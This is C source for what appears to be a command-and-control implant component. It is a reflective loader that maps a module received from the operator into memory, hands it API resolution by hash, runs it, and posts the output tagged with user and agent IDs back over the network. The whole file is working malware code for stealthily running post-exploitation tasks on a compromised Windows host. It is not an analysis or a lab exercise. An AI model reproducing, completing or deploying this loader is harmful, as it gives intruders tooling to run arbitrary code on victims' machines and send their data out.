#ifdef LOAD_AND_LISTEN
#include "../../includes/core/core.h"
#include "../../includes/core/utils.h"
#include "../../includes/comms/comms.h"
#include "../../includes/loader/loader.h"
#include "../../includes/parser/parser.h"




/*
INPUT
	[CODE] -> TASK_MODULE
	[]

OUTPUT
	[MSG_TYPE] 0xaf
	[output type]
	[user id]
	[agent id]
	per output type
	e.g for ls
	[file len] 4 bytes
	[file str] N bytes
	[entry type] 4 bytes
	[size] 4 bytes
	[end sig]
*/
void ModuleWrite4(PVOID ctx, DWORD val) {
	ParserWrite4((ParserWrite *)ctx, val);
}

void ModuleWrite8(PVOID ctx, ULONGLONG val) {
	ParserWrite8((ParserWrite *)ctx, val);
}

void ModuleWriteStr(PVOID ctx, PCHAR str, DWORD len) {
	ParserWriteRaw((ParserWrite *)ctx, (PBYTE)str, len);
}

HMODULE ModuleGetModule(DWORD hash) {
	return GetModule(hash);
}

FARPROC ModuleGetProc(HMODULE mod, DWORD hash) {
	return GetProc(mod, hash);
}

HMODULE ModuleLoadLibraryA(PCHAR name) {
	return ldr->win32->LoadLibraryA(name);
}

BOOL ModuleFreeLibrary(HMODULE mod) {
	return ldr->win32->FreeLibrary(mod);
}


BOOL LdrRunModule(LdrTask info, BOOL CleanUpAfter) {
	DBGA("[+] Mapping Module into memory\n");
	
	PIMAGE_OPTIONAL_HEADER pOpt = OPT_HEADER(info.Data);
	PIMAGE_SECTION_HEADER sec   = SECTION_HEADER(info.Data);
	WORD numSections            = FILE_HEADER(info.Data)->NumberOfSections;

	SIZE_T TotalSize  = pOpt->SizeOfImage;
	PVOID BaseAddress = NULL;
	DBGA("[+] Calling NtAllocate\n");
	if(!NT_SUCCESS(ldr->win32->NtAllocateVirtualMemory(CurrentProcess(), &BaseAddress, 0, &TotalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		DBGA("[*] NtAllocate Failed\n");
		return FALSE;
	}
	if (!BaseAddress) {
		DBGA("[*] BaseAddress NULL\n");

		return FALSE;
	}

	LdrMemcpy(BaseAddress, info.Data, pOpt->SizeOfHeaders);
	LdrCopySections(BaseAddress, info.Data, sec, numSections);
	LdrProcessRelocs(BaseAddress, info.Data);
	LdrSetSectionPerms(BaseAddress, sec, numSections);


	pModule mod = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Module));
	if (!mod)
		return FALSE;

	mod->size              = sizeof(Module);
	mod->Version           = 1;
	mod->ModuleWrite4      = ModuleWrite4;
	mod->ModuleWrite8      = ModuleWrite8;
	mod->ModuleWriteStr    = ModuleWriteStr;
	mod->ModuleGetModule   = ModuleGetModule;
	mod->ModuleGetProc     = ModuleGetProc;
	mod->ModuleLoadLibraryA = ModuleLoadLibraryA;
	mod->ModuleFreeLibrary = ModuleFreeLibrary;

	ParserWrite *p = ParserInitWrite();
	if (!p) {
		ldr->win32->LocalFree(mod);
		return FALSE;
	}

	ParserWrite4(p, MSG_OUTPUT);
	ParserWriteBytes(p, ldr->config->UserId, sizeof(ldr->config->UserId));
	ParserWriteBytes(p, ldr->config->AgentId, sizeof(ldr->config->AgentId));
	ParserWrite4(p, MSG_NEEDS_PARSE);

	pModuleEntry entry = (pModuleEntry)((PBYTE)BaseAddress + pOpt->AddressOfEntryPoint);
	DBGA("[*] Running Module\n");
	if (!entry(mod, (PVOID)p, (PBYTE)info.args, 0)) {
		DBGA("[!] Module returned failure\n");
	}
	DBGA("[*] Module ran succesfully");

	

	SIZE_T size = 0;
	ldr->win32->NtFreeVirtualMemory(CurrentProcess(), &BaseAddress, &size, MEM_RELEASE);
	if(info.args) {
		ldr->win32->LocalFree(info.args);
	}

	NwPostOutput(ParserWriteReturnPointer(p), ParserWriteReturnSize(p));
	ParserClearWrite(p);
	ldr->win32->LocalFree(mod);


	return TRUE;
}
#endif